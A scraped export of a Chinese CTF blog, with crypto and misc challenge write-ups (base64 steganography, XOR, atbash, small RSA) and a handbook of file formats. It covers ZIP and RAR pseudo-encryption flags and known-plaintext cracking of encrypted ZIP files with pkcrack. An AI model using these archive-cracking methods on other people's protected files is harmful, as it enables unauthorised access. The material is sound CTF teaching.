&#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,&#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;,&#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;,&#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;+&#x27;, &#x27;/&#x27;]cipher=&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;res=&#x27;&#x27;for i in range(len(cipher)): for j in range(64): if(dict[j]==cipher[i]): res+=base64_list[j]flag=base64.b64decode(res)print(flag) base一条龙给了一串base64，解密给出一堆乱码但是开头是RAR，直接写入文件。打开压缩包拿到一堆base64。尝试base64隐写，拿到一个网站，下载一个压缩包。得到一串类似base64的东西，接着尝试各种base密码。 12f=open(&#x27;flag.rar&#x27;,&#x27;wb&#x27;)f.write(str(base64.b64decode(steady_str))) 1b&#x27;Rar!\\x1a\\x07\\x01\\x00\\xf3\\xe1\\x82\\xeb\\x0b\\x01\\x05\\x07\\x00\\x06\\x01\\x01\\x80\\x80\\x80\\x00\\x98\\xa2;A&amp;\\x02\\x03\\x0b\\xbd\\x92\\x00\\x04\\xf8\\xe4\\x00 I\\xf8\\xd1C\\x80\\x03\\x00\\x08steg.txt\\n\\x03\\x02U\\xe2\\xb9w\\xa0\\xf3\\xd5\\x01\\xcc\\xa69\\t@\\x04344?5\\x04^\\xf3\\xe5_\\ri\\xa4\\xb5\\xeb\\xe1\\xbcr\\xb2b\\x94\\xaa\\xb3\\x15VR\\x89L]&amp;\\xe6\\xd4M\\xea\\xce\\x92\\xb7\\xc3\\xfe\\xda\\xf0\\xcc@\\x12&lt;\\x08M\\xb9RMo\\xe3\\x99x\\x91$\\x01`\\x0b\\x00/\\x9a\\x00\\x80@6\\r\\x8f\\x1b\\xbb\\x00]\\x12\\t\\xf9.\\x1d\\xfc~_9\\xbfx\\xbf\\x8f\\xdb\\xfa\\x92\\xca\\xbe\\xd2p\\xe5;\\xb5\\xdb\\xdfE\\xe3\\xc3\\x7f\\x8f_\\x8f\\x0b\\xbe\\xd2Q6\\xcf\\x1e\\xce\\x9el\\xbb\\xa2\\xf1\\xa6\\xac*\\xdbl\\xd9x\\xc0\\xcao\\xde\\xd2\\xf7h\\xc0W||\\xb9\\xed?\\xdc\\xfd\\x9f\\x1f\\x8f\\xe8\\xeeHlC\\xf4\\xa7S[\\x99\\x03\\xa9\\xc0xq-|1;\\x0b\\xb9\\xc9`C\\xa1\\xdao6&lt;N\\x02\\x99\\xc7\\x93%\\xed(xzph\\xac\\x90\\x1d\\xfb\\xb1\\x9a5\\xecw\\xa7\\x18\\xcd0u\\x03\\x11D\\xd3\\xab^\\xbb\\x89`\\xc0\\xee\\xc3\\x03\\xa1\\xe5\\xb0y1\\xde\\xdde\\xd4r7\\x07v\\xcc\\x85\\x84\\xb2\\x03\\xf7\\ 拿到RAR 12345import base64steady_str=&quot;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&quot;f=open(&#x27;flag.rar&#x27;,&#x27;wb&#x27;)#注意这里是以二进制的形式打开文件，才能够写入文件。f.write(str(base64.b64decode(steady_str))) base64隐写解密 1234567891011121314151617181920212223242526272829303132333435def get_base64_diff_value(s1, s2): base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; res = 0 for i in xrange(len(s2)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open(&#x27;steg.txt&#x27;, &#x27;rb&#x27;) as f: file_lines = f.readlines() bin_str = &#x27;&#x27; for line in file_lines: steg_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;) norm_line = line.replace(&#x27;\\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;) diff = get_base64_diff_value(steg_line, norm_line) print diff pads_num = steg_line.count(&#x27;=&#x27;) if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += &#x27;0&#x27; * pads_num * 2 print goflag(bin_str)def goflag(bin_str): res_str = &#x27;&#x27; for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i + 8], 2)) return res_strif __name__ == &#x27;__main__&#x27;: solve_stego() 1https:&#x2F;&#x2F;www.lanzous.com&#x2F;i9zuwhi base16&#x2F;32&#x2F;58&#x2F;64&#x2F;85&#x2F;91&#x2F;92 访问下载文件。尝试不同的base解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import base64import base91import base58import py3base92def hex_to_str(s): k=&#x27;&#x27; for i in range(0,len(s),2): j = s[i]+s[i+1] k+=chr(int(j,16)) print(&#x27;16&#x27;) return kdef ba32(s): s = base64.b32decode(s) s = bytes.decode(s) print(&#x27;32&#x27;) return sdef ba58(s): s = base58.b58decode(s) s = bytes.decode(s) print(&#x27;58&#x27;) return sdef ba64(s): s = base64.b64decode(s) s = bytes.decode(s) print(&#x27;64&#x27;) return sdef baa85(s): s = base64.a85decode(s) s = bytes.decode(s) print(&#x27;a85&#x27;) return sdef bab85(s): s = base64.b85decode(s) s = bytes.decode(s) print(&#x27;b85&#x27;) return sdef ba91(s): s = base91.decode(s) s = s.decode() print(&#x27;91&#x27;) return sdef ba92(s): s = py3base92.decode(s) print(&#x27;91&#x27;) return sdef start(s): for i in range(50): if len(s)&lt;50: print(s) try: s=hex_to_str(s) except: try: s=ba32(s) except: try: s=ba58(s) except: try: s=ba64(s) except: try: s = baa85(s) except: try: s=bab85(s) except: try: s = ba92(s) except: try: s=ba91(s) except: print(&#x27;nonono&#x27;) if __name__==&quot;__main__&quot;: f = open(&#x27;steg.txt&#x27;,&#x27;r&#x27;) s = f.read() start(s) 当出现的值为TkVLTFdUQVpvUlNda1ZXRUpAZVldTltgJCQhLCAgGSknPjc=时base64解码出现乱码。这应该是解密到最后的文件。终于发现原来需要异或。 123456789101112import base64s=&#x27;TkVLTFdUQVpvUlNda1ZXRUpAZVldTltgJCQhLCAgGSknPjc=&#x27;s=base64.b64decode(s)for i in range(256): flag=&quot;&quot; k=0 for j in s: res=j^(k+i) flag+=chr(res) k+=1 print(i,flag) 有趣起来了密⽂前部分应该是HDCTF 所以应该是置换成字⺟倒序 123456789de =&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;&#x27;en = &#x27;zyxwvutsrqponmlkjihgfedcba&#123;&#125;&#x27;string = &#x27;swxgu&#123;nlivrmgvivhgrmtxlwv&#125;&#x27;output = &#x27;&#x27;for i in string: for j in range(28): if i == en[j]: output+=de[j] print(output) babyrsa给出一个endeocde.py 1234567891011121314from binascii import a2b_hex,b2a_hexflag = &quot;*****************************&quot;p = 262248800182277040650192055439906580479q = 262854994239322828547925595487519915551e = 65533n = p*qc = pow(int(b2a_hex(flag),16),e,n)print cc = 68405618655091231850901459679785989915772760467494039910176075122809565696913 拿到p、q、c、e，我们可以求出d。 网题天干地支 天干有十个，地支有十二个，六十甲子 题目提示天干地支+甲子 所以这里用刚刚文件里的内容对照甲子的顺序数+60，通过ASCII码转换得到flag。","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"}]},{"title":"CTF-杂项手册","slug":"CTF-杂项手册","date":"2019-05-10T14:14:20.000Z","updated":"2020-11-15T09:59:47.051Z","comments":true,"path":"2019/05/10/CTF-杂项手册/","link":"","permalink":"http://s1eady.top/2019/05/10/CTF-%E6%9D%82%E9%A1%B9%E6%89%8B%E5%86%8C/","excerpt":"","text":"CTF杂项手册图片base64base64图片头：data:image/jpg;base64,。 文件格式PNG文件头总是由位固定的字节来描述，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。 总体来说就是： 1文件头 89 50 4E 47 0D 0A 1A 0A + 数据块 + 数据块 + 数据块…… 数据块 CHUNkPNG 定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块定义了 4 个标准数据块，每个 PNG 文件都必须包含它们，PNG 读写软件也都必须要支持这些数据块。 也就是说有的数据块是可选的，有的是必须有的，我们就介绍一下必须有的数据块。 对于每个数据块都有着统一的数据结构，每个数据块由 4 个部分组成。 Length（长度） 4 字节 指定数据块中数据域的长度，其长度不超过（231－1）字节 Chunk Type Code（数据块类型码） 4 字节 数据块类型码由 ASCII 字母（A - Z 和 a - z）组成 Chunk Data（数据块数据） 可变长度 存储按照 Chunk Type Code 指定的数据 CRC（循环冗余检测） 4 字节 存储用来检测是否有错误的循环冗余码 文件头数据块IHDR文件头数据块 IHDR（Header Chunk）：它包含有 PNG 文件中存储的图像数据的基本信息，由 13 字节组成，并要作为第一个数据块出现在 PNG 数据流中，而且一个 PNG 数据流中只能有一个文件头数据块。 文件头数据块（IHDR）定义了PNG文件的宽高、色深、压缩方法等参数。 上面我们讲了每个数据块都包含四个部分： 长度（Length）：4 bytes 数据块类型（Chunk Type）：4 bytes 数据块数据（Chunk Data）：Length bytes CRC校验码：4 bytes，由Chunk Type和Chunk Data 图像结束数据IEND图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。 100 00 00 00 49 45 4E 44 AE 42 60 82 IEND 数据块的长度总是 00 00 00 00，数据标识总是 IEND 49 45 4E 44，因此，CRC 码也总是 AE 42 60 82。 图像数据块IDAT图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。 IDAT 块只有当上一个块充满时，才会继续一个新的块。使用pngcheck工具进行检查，如果前一个数据块没有满，而后一个数据块有数据，则说明这里隐藏了信息。 JPGJPEG（Joint Photographic Experts Group）是联合图像专家小组的英文缩写。它由国际电话与电报咨询委员会CCITT（The International Telegraph and Telephone Consultative Committee）与国际标准化组织ISO于1986年联合成立的一个小组，负责制定静态数字图像的编码标准。 JPEG算法压缩出来的静态图片文件称为JPEG文件，扩展名通常为.jpg、.jpe、jpeg。 JPEG文件大体上可以分成两个部分：标记码(Tag)和压缩数据。 标记码由两个字节构成，其前一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值。在每个标记码之前还可以添加数目不限的无意义的0xFF填充，也就说连续的多个0xFF可以被理解为一个0xFF，并表示一个标记码的开始。而在一个完整的两字节的标记码后，就是该标记码对应的压缩数据流，记录了关于文件的诸种信息。 常用的标记有SOI、APP0、DQT、SOF0、DHT、DRI、SOS、EOI。 注意，SOI等都是标记的名称。在文件中，标记码是以标记代码形式出现。例如SOI的标记代码为0xFFD8，即在JPEG文件中的如果出现数据0xFFD8，则表示此处为一个SOI标记。 常用标记的标记代码、占用字节长度和表示的意义。 SOF0 序号 名称 长度 描述 ① 数据长度 2 字节 ①~⑥ 六个字段的总长度，即不包括标记代码，但包括本字段 ② 精度 1 字节 每个数据样本的位数，通常是 8 位，一般软件都不支持 12 位和 16 位 ③ 图像高度 2 字节 图像高度（单位：像素），如果不支持 DNL 就必须 &gt; 0 ④ 图像宽度 2 字节 图像宽度（单位：像素），如果不支持 DNL 就必须 &gt; 0 ⑤ 颜色分量数 1 字节 只有 3 个数值可选 1：灰度图；3：YCrCb 或 YIQ；4：CMYK； 而 JFIF 中使用 YCrCb，故这里颜色分量数恒为 3 ⑥ 颜色分量信息 颜色分量数×3字节（通常为 9 字节） 《颜色分量信息表格》 通常找到FFC0，之后的第三个到第七个字节就是长度和宽度。 ZIP一个 ZIP 文件由三个部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。 压缩源文件数据区： 50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度00 00：扩展记录长度 压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记(0x02014b50)3F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量 压缩源文件目录结束标志： 50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数59 00 00 00：目录区尺寸大小3E 00 00 00：目录区对第一张磁盘的偏移量00 00：ZIP 文件注释长度 总结：通过压缩源文件目录区50 4B 01 02 1F 00 14 00 0奇/偶 00 来表示是否加密。 RAR文件格式RAR 文件主要由标记块，压缩文件头块，文件头块，结尾块组成。Rar压缩包的文件头为 0x 52 61 72 21 1A 07 00。 RAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。 每个块的组成 名称 大小 描述 HEAD_CRC 2 全部块或块部分的CRC HEAD_TYPE 1 块类型 HEAD_FLAGS 2 阻止标志 HEAD_SIZE 2 块大小 ADD_SIZE 4 可选字段 - 添加块大小 结尾快结尾快（Terminator）都是固定的。 Field Name Size (bytes) Possibilities HEAD_CRC 2 Always 0x3DC4 HEAD_TYPE 1 Header type: 0x7b HEAD_FLAGS 2 Always 0x4000 HEAD_SIZE 2 Block size = 0x0007 MKV12root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman&#39; &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ogreman: Matroska data WAVRIFF格式「 Resource Interchange File Format（简称RIFF），资源交换文件格式，是一种按照标记区块存储数据（tagged chunks）的通用文件存储格式，多用于存储音频、视频等多媒体数据.Microsoft在windows下的AVI、ANI 、WAV等都是基于RIFF实现的。 RIFF是由chunk构成的，chunk是RIFF组成的基本单位，每个CHUNK可看作存贮了视频的一帧数据或者是音频的一帧数据。 CHUNK的结构CHUNK总共由三个部分组成： FOURCC 使用4字节的ASIIC字符标识类型 SIZE 数据的大小 DATA 用于存放数据 CHUNK在一般情况下不能嵌套，但是当CHUNK的FOURCC为”RIFF”或者是”LIST”的时候可以嵌套数据。 “RIFF”的第一个CHUNK的FOURCC一定是”RIFF”，所以FOURCC为LIST的一定是子CHUNK及SUBCHUNK。 “RIFF”的CHUNK在DATA区域的前四个字节称为”Form Type”记录了数据的类型，比如我们的wav文件的Form Type就是”WAV”。 脉冲编码调制（PCM）「PCM 脉冲编码调制是Pulse Code Modulation的缩写，脉冲编码调制是数字通信的编码方式之一.主要过程是将话音、图像等模拟信号每隔一定时间进行取样，使其离散化，同时将抽样值按分层单位四舍五入取整量化，同时将抽样值按一组二进制码来表示抽样脉冲的幅值。」 WAV文件的CHUNK信息WAVE文件是由若干个CHUNK组成的.按照文件中CHUNK的出现顺序分别为：RIFF Chunk, Format Chunk, Fact Chunk, Data Chunk,其中的Fact CHUNK为非必要部分，结构具体如下图所示： RIFF是头CHUNK,而Format CHUNK里面记录了WAV的各种参数信息，详细参数信息如下： FormatTag 音频数据的编码方式，其中PCM方式为1 Channels 声道数，单声道为1，双声道为2 SamplesPerSec 采样率(每秒样本数) BytesPerSec* 音频数据传送速率 BlockAlign* 每次采样的大小 BitsPerSample* 每个声道的采样精度 Python代码123456789101112131415161718192021import waveimport structfrom scipy import *from pylab import * #读取wav文件，我这儿读了个自己用python写的音阶的wavfilename = &#x27;1.wav&#x27;wavefile = wave.open(filename, &#x27;r&#x27;) # open for writing #读取wav文件的四种信息的函数。期中numframes表示一共读取了几个frames，在后面要用到滴。nchannels = wavefile.getnchannels()sample_width = wavefile.getsampwidth()framerate = wavefile.getframerate()numframes = wavefile.getnframes()info= wavefile.getparams() print(&quot;channel&quot;,nchannels)print(&quot;sample_width&quot;,sample_width)print(&quot;framerate&quot;,framerate)print(&quot;numframes&quot;,numframes)print(&quot;info&quot;,info) 12345channel 1sample_width 2framerate 8000numframes 159999info _wave_params(nchannels=1, sampwidth=2, framerate=8000, nframes=159999, comptype=&#x27;NONE&#x27;, compname=&#x27;not compressed&#x27;) PYC103F30D0A 12t@kali:~&#x2F;桌面&#x2F;steady# file &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;O_O &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;O_O: python 3.6 byte-compiled ELF文件7F 45 4C 46。 12file &#x27;/root/桌面/flag/1&#x27; /root/桌面/flag/1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8df45089fa39fec83423ec37a944e81065d16bee, not stripped 使用ideal或者linux直接打开。 vmdk12root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;_mianju.jpg.extracted&#x2F;flag.vmdk&#39; &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;_mianju.jpg.extracted&#x2F;flag.vmdk: VMware4 disk image vmdk也可以用7z解压。 avi视频文件。 12file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;zip&#x2F;里面都是出题人.jpg&#39; &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;zip&#x2F;里面都是出题人.jpg: RIFF (little-endian) data, AVI, 720 x 480, ~30 fps, video: uncompressed, audio: uncompressed PCM (stereo, 48000 Hz) 152 49 46 46 1C 7D 7D 02 elf 可以直接在linux下运行。 12steady@steady:~&#x2F;桌面&#x2F;steady$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;hidden_binary&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;hidden_binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;101705e6f60a300ab34f377a87fdb67f92996732, for GNU&#x2F;Linux 3.2.0, not stripped 工具使用01editor 可以使用搜索功能搜索十六进制和ascii，搜索-&gt;查找。 更换编码方式。 notepad++解码 标记替换功能 转换大小写 生成md5","categories":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"}]},{"title":"CTF-杂项题总结","slug":"CTF-杂项题总结","date":"2019-05-10T14:14:20.000Z","updated":"2020-11-15T10:00:13.310Z","comments":true,"path":"2019/05/10/CTF-杂项题总结/","link":"","permalink":"http://s1eady.top/2019/05/10/CTF-%E6%9D%82%E9%A1%B9%E9%A2%98%E6%80%BB%E7%BB%93/","excerpt":"","text":"CTF-杂项压缩包注释注释藏头flag，查看注释可以放入winhex查看十六进制的末尾(最好使用这种方式，因为有时候压缩包注释可能是隐藏的)，或者直接压缩软件查看十六进制。如果遇到隐藏的注释，可以放入sublim或者notepad++。 如果RAR压缩包中有注释的话，在winhex中的ascii中会有CMT字段。 zipinfo查看元数据123456789101112131415161718192021222324252627282930313233steady@steady:~&#x2F;桌面&#x2F;steady$ zipinfo -v &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.zipCentral directory entry #1:--------------------------- 1.py offset of local header from start of archive: 0 (0000000000000000h) bytes file system or operating system of origin: MS-DOS, OS&#x2F;2 or NT FAT version of encoding software: 6.3 minimum file system compatibility required: MS-DOS, OS&#x2F;2 or NT FAT minimum software version required to extract: 2.0 compression method: deflated compression sub-type (deflation): normal file security status: not encrypted extended local header: no file last modified on (DOS date&#x2F;time): 2020 Nov 6 11:55:08 32-bit CRC value (hex): 01e344f3 compressed size: 385 bytes uncompressed size: 771 bytes length of filename: 4 characters length of extra field: 36 bytes length of file comment: 0 characters disk number on which file begins: disk 1 apparent file type: binary non-MSDOS external file attributes: 000000 hex MS-DOS file attributes (20 hex): arc The central-directory extra field contains: - A subfield with ID 0x000a (PKWARE Win32) and 32 data bytes. The first 20 are: 00 00 00 00 01 00 18 00 d0 b0 f5 9d f0 b3 d6 01 d0 b0 f5 9d. There is no file comment. 压缩包解压大多是使用python自动化解压，常用的python库为zipfile、unrar。 比如： 直接批量读取文件。 123456import base64flag=&quot;&quot;for i in range(0,32): f=open(&#x27;C:/Users/12521/Desktop/subject/&#x27;+str(i)+&#x27;/&#x27;+str(i)+&#x27;.txt&#x27;,&#x27;r&#x27;) flag+=f.read()print(base64.b64decode(flag)) 批量解压带有密码的压缩包，文件名字就是压缩包的密码(zip、rar同理)。 123456789101112import osfrom unrar import rarfiledef unzip(zipname): while True: passwd = zipname[0:6] zf = rarfile.RarFile(&#x27;C:/Users/12521/gif/&#x27;+zipname,&#x27;r&#x27;) zf.extractall(&#x27;./gif/&#x27;,pwd=passwd)# zf.close() os.remove(zipname) zipname = zf.namelist()[0].replace(&#x27;\\\\&#x27;,&#x27;/&#x27;) print(zipname)unzip(&quot;flag.rar&quot;) 伪加密ZIP总结：通过压缩源文件目录区50 4B 01 02 1F 00 14 00 0奇/偶 00 来表示是否加密。 伪加密RARRAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。 明文攻击前提： 有一个已知的文件，然后加密的压缩包中也有一个我们已知的文件，这时候我们可以尝试明文攻击。 攻击方式： 首先我们需要把我们的已知的文件使用winrar进行压缩，这里必须使用winrar文件，而且我们需要保证我们手动压缩的文件和我们需要解密的文件后缀以及压缩方式是一样的。 这里使用工具可以直接破解。如果工具提示无法载入，可以使用winrar的修复功能对压缩包进行修复。 两个文件 具体的文件拓扑图 明文攻击的具体特点就是敏感文件的CRC值是一样的。这里我们可以使用WINRA工具进行查看。 只有一个文件手动生成一个文件然后rbkcrack.exe进行破解。 kali 明文攻击1steady@steady:~&#x2F;bin$ .&#x2F;pkcrack -c &quot;logo.png&quot; 